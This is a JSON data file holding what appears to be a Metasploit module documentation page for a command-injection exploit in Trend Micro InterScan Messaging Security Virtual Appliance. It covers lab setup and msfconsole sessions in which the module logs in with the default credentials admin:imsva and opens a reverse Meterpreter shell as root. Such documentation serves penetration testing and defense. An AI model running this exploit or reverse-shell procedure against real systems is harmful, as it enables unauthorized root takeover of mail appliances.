{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/trend_micro_imsva_exec","result":{"data":{"moduleMetadataJson":{"id":"2c2f2b9e-1a61-5902-9558-b41ec146defb","name":"Trend Micro InterScan Messaging Security (Virtual Appliance) Remote Code Execution","fullname":"exploit/linux/http/trend_micro_imsva_exec","description":"This module exploits a command injection vulnerability in the Trend Micro\n        IMSVA product. An authenticated user can execute a terminal command under\n        the context of the web server user which is root. Besides, default installation\n        of IMSVA comes with a default administrator credentials.\n\n        saveCert.imss endpoint takes several user inputs and performs blacklisting.\n        After that it use them as argument of predefined operating system command\n        without proper sanitation. However, due to improper blacklisting rule it's possible to inject\n        arbitrary commands into it. InterScan Messaging Security prior to 9.1.-1600 affected by this issue.\n\n        This module was tested against IMSVA 9.1-1600.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/trend_micro_imsva_exec","documentationSlug":"/modules/documentation/exploit/linux/http/trend_micro_imsva_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a command injection vulnerability in the Trend Micro InterScan Messaging Security (Virtual Appliance) product. An authenticated user can execute a terminal command under the context of the web server user which is root. Besides, default installation of IMSVA comes with a default administrator credentials.</p>\n<p>saveCert.imss endpoint takes several user inputs and performs blacklisting. After that it use them as argument of predefined operating system command without proper sanitation. However,due to improper blacklisting rule it's possible to inject arbitrary commands into it. InterScan Messaging Security prior to 9.1.-1600 affected by this issue.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<p>IMSVA is distrubed as an ISO image by Trend Micro.</p>\n<p>Following steps are valid on the CentOS 6 x64 bit operating system.</p>\n<ol>\n<li>Open following URL <a href=\"http://downloadcenter.trendmicro.com/\">http://downloadcenter.trendmicro.com/</a></li>\n<li>Find \"InterScan Messaging Security (Virtual Appliance)\" and click.</li>\n<li>At the time of writing this documentation, you must see \"IMSVA-9.1-1600-x86-64-r2.iso\" next to Download button.</li>\n<li>Click to the download button and complete installation of ISO.</li>\n</ol>\n<p>If you don't see a affected version of IMSVA, you can try to download IMSVA-9.1-1600 directly from following URL.</p>\n<p><a href=\"http://files.trendmicro.com/products/imsva/9.1/IMSVA-9.1-1600-x86_64-r2.iso\">http://files.trendmicro.com/products/imsva/9.1/IMSVA-9.1-1600-x86_64-r2.iso</a></p>\n<p><strong>System requirements:</strong></p>\n<ul>\n<li>Virtualbox or VMware can be used. </li>\n<li>4 GB of memory at least.</li>\n<li>120 GB of disk size at least.</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/trend_micro_imsva_exec \nmsf exploit(trend_micro_imsva_exec) &gt; set RHOST 12.0.0.140\nRHOST =&gt; 12.0.0.140\nmsf exploit(trend_micro_imsva_exec) &gt; set LHOST 12.0.0.1 \nLHOST =&gt; 12.0.0.1\nmsf exploit(trend_micro_imsva_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Attempting to login with admin:imsva\n[+] Authenticated as admin:imsva\n[*] Delivering payload...\n[*] Sending stage (38622 bytes) to 12.0.0.140\n[*] Meterpreter session 1 opened (12.0.0.1:4444 -&gt; 12.0.0.140:60822) at 2017-01-18 11:29:36 +0300\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>You must be getting <code class=\"language-text\">no access</code> error if the supplied username and password or default credentials are wrong.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(trend_micro_imsva_exec) &gt; back\nmsf &gt; use exploit/linux/http/trend_micro_imsva_exec \nmsf exploit(trend_micro_imsva_exec) &gt; set RHOST 12.0.0.140\nRHOST =&gt; 12.0.0.140\nmsf exploit(trend_micro_imsva_exec) &gt; set LHOST 12.0.0.1 \nLHOST =&gt; 12.0.0.1\nmsf exploit(trend_micro_imsva_exec) &gt; \nmsf exploit(trend_micro_imsva_exec) &gt; set USERNAME notvalid\nUSERNAME =&gt; notvalid\nmsf exploit(trend_micro_imsva_exec) &gt; set PASSWORD notvalid123\nPASSWORD =&gt; notvalid123\nmsf exploit(trend_micro_imsva_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 12.0.0.1:4444 \n[*] Attempting to login with notvalid:notvalid123\n[-] Exploit aborted due to failure: no-access: 12.0.0.140:8445 - Login with notvalid:notvalid123 failed...\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"2c2f2b9e-1a61-5902-9558-b41ec146defb"}}}